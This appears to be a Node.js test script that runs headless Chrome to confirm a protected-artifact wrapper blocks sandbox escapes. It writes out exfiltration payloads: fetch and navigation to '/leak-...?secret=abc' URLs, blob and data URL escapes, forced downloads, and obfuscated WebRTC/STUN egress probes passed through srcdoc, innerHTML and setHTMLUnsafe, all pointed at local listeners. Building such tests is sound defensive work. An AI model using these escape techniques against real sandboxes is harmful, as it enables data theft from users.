#!/usr/bin/env node

import assert from 'node:assert/strict'
import { spawn } from 'node:child_process'
import { createSocket } from 'node:dgram'
import { createServer } from 'node:http'
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import {
  artifactDownloadBridgeSource,
  buildProtectedArtifactWrapperDocument,
  makeArtifactDocumentStatic,
} from '../src/lib/protected-artifact-wrapper.mjs'
import {
  CdpClient,
  chromeExecutable,
  waitForWebSocketUrl,
} from './measure-html-artifacts.mjs'

function artifactDocument(script, body = '') {
  return `<!doctype html><html><head><meta charset="utf-8"></head><body>${body}<script>${script}</script></body></html>`
}

function inlineScriptString(value) {
  return JSON.stringify(value).replace(/<\//g, '<\\/')
}

async function navigateCase(client, sessionId, url) {
  const loaded = client.waitFor('Page.loadEventFired', sessionId)
  await client.send('Page.navigate', { url }, sessionId)
  await loaded
  await new Promise((resolve) => setTimeout(resolve, 750))
}

async function bindUdpProbe(packets) {
  const server = createSocket('udp4')
  server.on('message', (packet) => packets.push(packet.byteLength))
  await new Promise((resolve, reject) => {
    server.once('error', reject)
    server.bind(0, '127.0.0.1', () => {
      server.off('error', reject)
      resolve()
    })
  })
  return server
}

function waitForChildExit(child, timeoutMs) {
  if (child.exitCode !== null || child.signalCode !== null) return Promise.resolve(true)
  return new Promise((resolve) => {
    let settled = false
    const finish = (exited) => {
      if (settled) return
      settled = true
      clearTimeout(timer)
      child.off('exit', onExit)
      resolve(exited)
    }
    const onExit = () => finish(true)
    const timer = setTimeout(() => finish(false), timeoutMs)
    timer.unref()
    child.once('exit', onExit)
  })
}

async function closeChrome(child) {
  if (child.exitCode === null && child.signalCode === null) {
    child.kill('SIGTERM')
    if (!(await waitForChildExit(child, 2_000))) {
      child.kill('SIGKILL')
      await waitForChildExit(child, 2_000)
    }
  }
  child.stderr?.destroy()
}

async function main() {
  const staticLinks = makeArtifactDocumentStatic(
    '<meta http-equiv="&#x72;efresh" content="0;url=/escape">'
      + '<svg><set href="#target" attributeName="href" to="/escape"></set></svg>'
      + '<a href="/privacy" target="_blank" ping="/track" download>Leave</a>'
      + '<area href="/account" ping="/area-track">'
      + '<a xlink:href="/legacy-svg-link">Legacy</a>'
      + '<a href="#details" ping="/fragment-track">Jump</a>',
  )
  assert.doesNotMatch(staticLinks, /\/privacy|\/account|\/legacy-svg-link|target=|ping=|download/)
  assert.doesNotMatch(staticLinks, /http-equiv|<set\b|<\/set>/i)
  assert.match(staticLinks, /href="#details"/)

  const executable = chromeExecutable()
  if (!executable) throw new Error('Chrome was not found for the protected-artifact sandbox guard.')

  const leakRequests = []
  const webrtcPackets = []
  const positiveWebrtcPackets = []
  const positiveSetHtmlPackets = []
  const positiveShadowHtmlPackets = []
  let baseUrl = ''
  const bridge = artifactDownloadBridgeSource()
  const stunServer = await bindUdpProbe(webrtcPackets)
  const positiveStunServer = await bindUdpProbe(positiveWebrtcPackets)
  const positiveSetHtmlStunServer = await bindUdpProbe(positiveSetHtmlPackets)
  const positiveShadowHtmlStunServer = await bindUdpProbe(positiveShadowHtmlPackets)
  const stunAddress = stunServer.address()
  const positiveStunAddress = positiveStunServer.address()
  const positiveSetHtmlStunAddress = positiveSetHtmlStunServer.address()
  const positiveShadowHtmlStunAddress = positiveShadowHtmlStunServer.address()
  if (
    typeof stunAddress === 'string' ||
    typeof positiveStunAddress === 'string' ||
    typeof positiveSetHtmlStunAddress === 'string' ||
    typeof positiveShadowHtmlStunAddress === 'string'
  ) {
    throw new Error('WebRTC guard UDP servers did not bind.')
  }
  const stunUrl = `stun:127.0.0.1:${stunAddress.port}`
  const positiveStunUrl = `stun:127.0.0.1:${positiveStunAddress.port}`
  const positiveSetHtmlStunUrl = `stun:127.0.0.1:${positiveSetHtmlStunAddress.port}`
  const positiveShadowHtmlStunUrl = `stun:127.0.0.1:${positiveShadowHtmlStunAddress.port}`
  const webrtcProbe = `(async()=>{const peer=new RTCPeerConnection({iceServers:[{urls:${JSON.stringify(stunUrl)}}]});peer.createDataChannel('pathforge-egress-probe');await peer.setLocalDescription(await peer.createOffer());})().catch(()=>{});`
  const positiveWebrtcProbe = `(async()=>{const peer=new RTCPeerConnection({iceServers:[{urls:${JSON.stringify(positiveStunUrl)}}]});peer.createDataChannel('pathforge-positive-control');await peer.setLocalDescription(await peer.createOffer());})().catch(()=>{});`
  const positiveSetHtmlProbe = `(async()=>{const peer=new RTCPeerConnection({iceServers:[{urls:${JSON.stringify(positiveSetHtmlStunUrl)}}]});peer.createDataChannel('pathforge-sethtmlunsafe-positive-control');await peer.setLocalDescription(await peer.createOffer());})().catch(()=>{});`
  const positiveShadowHtmlProbe = `(async()=>{const peer=new RTCPeerConnection({iceServers:[{urls:${JSON.stringify(positiveShadowHtmlStunUrl)}}]});peer.createDataChannel('pathforge-shadow-sethtmlunsafe-positive-control');await peer.setLocalDescription(await peer.createOffer());})().catch(()=>{});`
  const setHtmlUnsafeMarkup = `<iframe srcdoc="${artifactDocument(webrtcProbe).replaceAll('"', '&quot;')}"></iframe>`
  const positiveSetHtmlUnsafeMarkup = `<iframe srcdoc="${artifactDocument(positiveSetHtmlProbe).replaceAll('"', '&quot;')}"></iframe>`
  const positiveShadowHtmlUnsafeMarkup = `<iframe srcdoc="${artifactDocument(positiveShadowHtmlProbe).replaceAll('"', '&quot;')}"></iframe>`
  const wrapperFactories = {
    'webrtc-positive-control': () => artifactDocument(
      `const frame=document.createElement('iframe');frame.srcdoc=${inlineScriptString(artifactDocument(positiveWebrtcProbe))};document.body.append(frame);`,
    ),
    'webrtc-sethtmlunsafe-positive-control': () => artifactDocument(
      `document.body.setHTMLUnsafe(${inlineScriptString(positiveSetHtmlUnsafeMarkup)});`,
    ),
    'webrtc-shadow-sethtmlunsafe-positive-control': () => artifactDocument(
      `const host=document.createElement('div');document.body.append(host);host.attachShadow({mode:'open'}).setHTMLUnsafe(${inlineScriptString(positiveShadowHtmlUnsafeMarkup)});`,
    ),
    http: () => buildProtectedArtifactWrapperDocument(artifactDocument(
      `window.parent.postMessage({type:'pathforge-artifact-size',width:100,height:100},'*'); location.href=${JSON.stringify(`${baseUrl}/leak-http?secret=abc`)};`,
    )),
    blob: () => {
      const escapeDocument = `<script>fetch(${JSON.stringify(`${baseUrl}/leak-blob?secret=abc`)})<\/script>`
      return buildProtectedArtifactWrapperDocument(artifactDocument(
        `window.parent.postMessage({type:'pathforge-artifact-size',width:100,height:100},'*'); const escapeUrl=URL.createObjectURL(new Blob([${JSON.stringify(escapeDocument)}],{type:'text/html'})); location.href=escapeUrl;`,
      ))
    },
    data: () => {
      const escapeDocument = `<script>fetch(${JSON.stringify(`${baseUrl}/leak-data?secret=abc`)})<\/script>`
      return buildProtectedArtifactWrapperDocument(artifactDocument(
        `window.parent.postMessage({type:'pathforge-artifact-size',width:100,height:100},'*'); location.href=${JSON.stringify(`data:text/html,${encodeURIComponent(escapeDocument)}`)};`,
      ))
    },
    download: () => buildProtectedArtifactWrapperDocument(artifactDocument(
      `${bridge}; const external=document.createElement('a'); external.download='stolen.txt'; external.href=${JSON.stringify(`${baseUrl}/leak-download?secret=abc`)}; document.body.append(external); external.click();`,
    )),
    webrtc: () => buildProtectedArtifactWrapperDocument(artifactDocument(webrtcProbe)),
    'webrtc-obfuscated': () => buildProtectedArtifactWrapperDocument(artifactDocument(
      `(async()=>{const Peer=globalThis['RTC'+'PeerConnection'];const peer=new Peer({iceServers:[{urls:${JSON.stringify(stunUrl)}}]});peer.createDataChannel('pathforge-obfuscated-egress-probe');await peer.setLocalDescription(await peer.createOffer());})().catch(()=>{});`,
    )),
    'webrtc-srcdoc': () => buildProtectedArtifactWrapperDocument(artifactDocument(
      `const frame=document.createElement('iframe');frame.srcdoc=${inlineScriptString(artifactDocument(webrtcProbe))};document.body.append(frame);`,
    )),
    'webrtc-srcdoc-obfuscated': () => buildProtectedArtifactWrapperDocument(artifactDocument(
      `const frame=document.createElement('i'+'frame');frame.srcdoc=${inlineScriptString(artifactDocument(webrtcProbe))};document.body.append(frame);`,
    )),
    'webrtc-srcdoc-domparser': () => buildProtectedArtifactWrapperDocument(artifactDocument(
      `const parsed=new DOMParser().parseFromString('<iframe></iframe>','text/html');const frame=parsed.querySelector('iframe');frame.setAttribute('srcdoc',${inlineScriptString(artifactDocument(webrtcProbe))});document.body.append(frame);`,
    )),
    'webrtc-srcdoc-innerhtml': () => buildProtectedArtifactWrapperDocument(artifactDocument(
      `const holder=document.createElement('div');holder.innerHTML=${inlineScriptString(`<iframe srcdoc="${artifactDocument(webrtcProbe).replaceAll('"', '&quot;')}"></iframe>`)};document.body.append(holder);`,
    )),
    'webrtc-srcdoc-sethtmlunsafe': () => buildProtectedArtifactWrapperDocument(artifactDocument(
      `document.body['setHTML'+'Unsafe'](${inlineScriptString(setHtmlUnsafeMarkup)});`,
    )),
    'webrtc-srcdoc-shadow-sethtmlunsafe': () => buildProtectedArtifactWrapperDocument(artifactDocument(
      `const host=document.createElement('div');document.body.append(host);host.attachShadow({mode:'open'})['setHTML'+'Unsafe'](${inlineScriptString(setHtmlUnsafeMarkup)});`,
    )),
    'webrtc-blob': () => {
      const escapeDocument = `<script>${webrtcProbe}<\/script>`
      return buildProtectedArtifactWrapperDocument(artifactDocument(
        `const escapeUrl=URL.createObjectURL(new Blob([${JSON.stringify(escapeDocument)}],{type:'text/html'}));location.href=escapeUrl;`,
      ))
    },
    'webrtc-data': () => {
      const escapeDocument = `<script>${webrtcProbe}<\/script>`
      return buildProtectedArtifactWrapperDocument(artifactDocument(
        `location.href=${JSON.stringify(`data:text/html,${encodeURIComponent(escapeDocument)}`)};`,
      ))
    },
    'community-static-script-disabled': () => buildProtectedArtifactWrapperDocument(artifactDocument(
      `${webrtcProbe}; location.href=${JSON.stringify(`${baseUrl}/leak-static-script?secret=abc`)};`,
    ), { allowArtifactScripts: false }),
    'community-static-passive-resource': () => buildProtectedArtifactWrapperDocument(
      `<!doctype html><html><head><meta charset="utf-8"></head><body><img alt="Static preview probe" src="${baseUrl}/leak-static-passive"></body></html>`,
      { allowArtifactScripts: false },
    ),
    safe: () => buildProtectedArtifactWrapperDocument(artifactDocument(
      `${bridge}; document.getElementById('safe').addEventListener('click',()=>{ const url=URL.createObjectURL(new Blob(['safe export'],{type:'text/plain'})); const link=document.createElement('a'); link.download='safe.txt'; link.href=url; document.body.append(link); link.click(); URL.revokeObjectURL(url); link.remove(); });`,
      '<button id="safe" style="position:fixed;left:20px;top:20px;width:140px;height:48px">Safe export</button>',
    )),
  }

  const server = createServer((request, response) => {
    const url = new URL(request.url ?? '/', baseUrl)
    if (url.pathname.startsWith('/leak-')) {
      leakRequests.push(url.pathname)
      response.writeHead(204).end()
      return
    }
    const name = url.pathname.replace(/^\//, '') || 'http'
    const wrapperFactory = wrapperFactories[name]
    if (!wrapperFactory) {
      response.writeHead(404).end('not found')
      return
    }
    response.writeHead(200, {
      'content-type': 'text/html; charset=utf-8',
      'cache-control': 'no-store',
    })
    response.end(wrapperFactory())
  })
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve))
  const address = server.address()
  if (!address || typeof address === 'string') throw new Error('Sandbox guard server did not bind.')
  baseUrl = `http://127.0.0.1:${address.port}`

  const profile = mkdtempSync(path.join(tmpdir(), 'pathforge-artifact-sandbox-'))
  const child = spawn(executable, [
    '--headless=new',
    '--disable-gpu',
    '--disable-dev-shm-usage',
    '--no-sandbox',
    '--no-first-run',
    '--remote-debugging-address=127.0.0.1',
    '--remote-debugging-port=0',
    `--user-data-dir=${profile}`,
    'about:blank',
  ], { stdio: ['ignore', 'ignore', 'pipe'] })

  let client
  try {
    client = new CdpClient(await waitForWebSocketUrl(child))
    await client.ready()
    const { targetId } = await client.send('Target.createTarget', { url: 'about:blank' })
    const { sessionId } = await client.send('Target.attachToTarget', { targetId, flatten: true })
    await Promise.all([
      client.send('Page.enable', {}, sessionId),
      client.send('Runtime.enable', {}, sessionId),
    ])

    await navigateCase(client, sessionId, `${baseUrl}/webrtc-positive-control`)
    await new Promise((resolve) => setTimeout(resolve, 1_000))
    if (positiveWebrtcPackets.length === 0) {
      throw new Error('WebRTC positive control emitted no STUN packet; the denial assertion would be inconclusive.')
    }
    await navigateCase(client, sessionId, `${baseUrl}/webrtc-sethtmlunsafe-positive-control`)
    await new Promise((resolve) => setTimeout(resolve, 1_000))
    if (positiveSetHtmlPackets.length === 0) {
      throw new Error('Element.setHTMLUnsafe positive control emitted no STUN packet; its denial assertion would be inconclusive.')
    }
    await navigateCase(client, sessionId, `${baseUrl}/webrtc-shadow-sethtmlunsafe-positive-control`)
    await new Promise((resolve) => setTimeout(resolve, 1_000))
    if (positiveShadowHtmlPackets.length === 0) {
      throw new Error('ShadowRoot.setHTMLUnsafe positive control emitted no STUN packet; its denial assertion would be inconclusive.')
    }

    for (const name of [
      'http',
      'blob',
      'data',
      'download',
      'webrtc',
      'webrtc-obfuscated',
      'webrtc-srcdoc',
      'webrtc-srcdoc-obfuscated',
      'webrtc-srcdoc-domparser',
      'webrtc-srcdoc-innerhtml',
      'webrtc-srcdoc-sethtmlunsafe',
      'webrtc-srcdoc-shadow-sethtmlunsafe',
      'webrtc-blob',
      'webrtc-data',
      'community-static-script-disabled',
      'community-static-passive-resource',
    ]) {
      await navigateCase(client, sessionId, `${baseUrl}/${name}`)
    }
    if (leakRequests.length > 0) {
      throw new Error(`Protected artifact escaped through: ${leakRequests.join(', ')}`)
    }
    await new Promise((resolve) => setTimeout(resolve, 1_000))
    if (webrtcPackets.length > 0) {
      throw new Error(`Protected artifact emitted ${webrtcPackets.length} WebRTC/STUN packet(s).`)
    }

    await navigateCase(client, sessionId, `${baseUrl}/safe`)
    const { result: loadedResult } = await client.send('Runtime.evaluate', {
      expression: `document.getElementById('pathforge-artifact-document')?.dataset.pathforgeLoaded ?? ''`,
      returnByValue: true,
    }, sessionId)
    if (loadedResult.value !== 'true') {
      throw new Error('Protected artifact inner frame did not load.')
    }
    await client.send('Input.dispatchMouseEvent', {
      type: 'mousePressed',
      x: 90,
      y: 44,
      button: 'left',
      clickCount: 1,
    }, sessionId)
    await client.send('Input.dispatchMouseEvent', {
      type: 'mouseReleased',
      x: 90,
      y: 44,
      button: 'left',
      clickCount: 1,
    }, sessionId)
    await new Promise((resolve) => setTimeout(resolve, 350))
    const { result: forwardedResult } = await client.send('Runtime.evaluate', {
      expression: `document.getElementById('pathforge-artifact-document')?.dataset.lastForwardedType ?? ''`,
      returnByValue: true,
    }, sessionId)
    if (forwardedResult.value !== 'pathforge-artifact-download') {
      throw new Error('Bounded blob download did not traverse the protected bridge.')
    }

    await client.send('Target.closeTarget', { targetId })
  } finally {
    client?.close()
    await closeChrome(child)
    await new Promise((resolve) => server.close(resolve))
    await new Promise((resolve) => stunServer.close(resolve))
    await new Promise((resolve) => positiveStunServer.close(resolve))
    await new Promise((resolve) => positiveSetHtmlStunServer.close(resolve))
    await new Promise((resolve) => positiveShadowHtmlStunServer.close(resolve))
    rmSync(profile, { recursive: true, force: true, maxRetries: 8, retryDelay: 125 })
  }

  console.log('Protected artifact sandbox navigation, nested-realm, WebRTC, and download guard passed with a positive UDP control.')
}

main().catch((error) => {
  console.error(error instanceof Error ? error.message : String(error))
  process.exit(1)
})
